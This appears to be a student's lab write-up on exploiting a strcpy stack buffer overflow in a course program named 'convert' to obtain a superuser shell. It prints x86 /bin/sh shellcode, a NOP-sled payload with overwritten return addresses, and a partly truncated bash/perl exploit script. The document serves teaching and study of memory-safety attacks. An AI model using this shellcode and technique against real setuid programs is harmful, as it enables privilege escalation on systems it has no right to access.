## Hacking the Superuser to get access to the supersecret file

Given the C program *convert.c* find a way to execute Shell Code by overflowing the unprotected buffer.

### The convert program
The superuser's program, *convert*, is a simple C program that given a number of Bitcoins and a date it returns the amount of dollars they were valued at that time. It uses the *bitcoin.txt* to do so.

### Finding the weak spot

By reading the code we can see that the instruction
```c
    strcpy(date,argv[2]);
```
give us the opportunity to overflow the `date` buffer because there aren't any bound check to see if `argv[2]` is smaller or equal to 720, the length of the `date` char array.

### Trial and error
I filled date with a large random string and the program crashed giving me a SEGMENTATION fault and confirming the vulnerability of the executable.

Then I tried to prepare the proper input to get the program to execute my [Shell code](https://github.com/JasonPap/Buffer-Overflows/tree/master/shellcode):

```sh
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

and filling the empty space before the Shell code with "\x90", the Hex code of NOP instruction, to a total length of 720 chars.

Then I had to use **GDB** to find where in the stack is saved the `date` buffer so I could point back. By printing the address of the `arglist` I was able to figure it out. Then, all I had to do is to write that address several times (about 4) at the end of my input (after the 720 chars) so it would overwrite the saved eip, the return address. 

My string now looked something like this:
```
…\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf
```
./convert 1 'myString'

That didn't work (and could never work that way). Except for the "\" character everything else was copied to the memory as their corresponding hex representation. For example, 'a' was replaced with 0x61 etc.

I had to find a way to write to the memory exactly the Bytes of code I had in my string. So I tried online hex to char converters to try to reverse the conversion that happened before. That didn’t work either because I couldn't copy-paste those characters that didn't appear correctly.


### Solving the puzzle
By using the exploit3.c code provided by Aleph One [here](http://insecure.org/stf/smashstack.html) with 800 as command line argument I was able to get access to the supersecret.txt quickly.

Although the problem was solved I tried another way to do it.

I wrote a Bash script to generate the right string that would overflow the date buffer and give me access to the *supersecret.txt*. I used **Perl** commands to convert my Shell code to characters (each byte a char). And again GDB to find the address of the `date` buffer and see what was written to the `saved eip` after the overflow to make sure I was writing an address somewhere in the NOP slide.

```
#!/bin/bash
arg=`perl -e 'printf"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\$ 

arg2=`perl -e 'printf"\x96\xf6\xff\xbf"'` #the address that will overwrite the return address. 

../superuser/convert 2 $arg$arg2

```

Now I had a shell running with the superuser's privileges.

### Useful links
Those are a collection of websites I used during my successful and un-successful trials.

* [tldp.org](http://www.tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html)
* [crypto.di.uoa.gr](https://crypto.di.uoa.gr/csec/Asphaleia_Ypologistikon_Systematon/Semeioseis_files/gdb-tut.pdf)  (in Greek)
* [insecure.org](http://insecure.org/stf/smashstack.html)
* [velocityreviews.com](http://www.velocityreviews.com/forums/t727636-print-hex-value-of-char.html)
* [linuxquestions.org](http://www.linuxquestions.org/questions/programming-9/%5Bbash%5D-ascii-to-hex-and-hex-to-ascii-488357/)
* [Microsoft.com](https://msdn.microsoft.com/en-us/library/9hxt0028.aspx)
* [csail.mit.edu](http://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf)
* [stackoverflow.com](http://stackoverflow.com/questions/8534607/how-to-fix-buffer-overflow-return-address-failure)


